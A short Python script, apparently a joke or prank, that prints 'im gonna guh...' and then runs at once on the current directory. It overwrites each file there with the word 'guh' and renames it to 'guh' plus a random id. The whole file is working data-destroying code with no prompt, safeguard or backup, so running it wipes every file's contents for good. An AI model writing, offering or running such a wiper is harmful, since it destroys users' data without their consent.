import os
from string import ascii_letters, digits
import random



def guhify():
    used_ids = []
    for dir in os.listdir():
        id = make_id()
        while id in used_ids:
            id = make_id()
        used_ids.append(id)
        with open(dir, 'w') as file:
            file.write("guh")
        os.rename(dir, f"guh{id}")


def make_id():
    return ''.join(random.choices(ascii_letters + digits, k=20))


print("im gonna guh...")
guhify()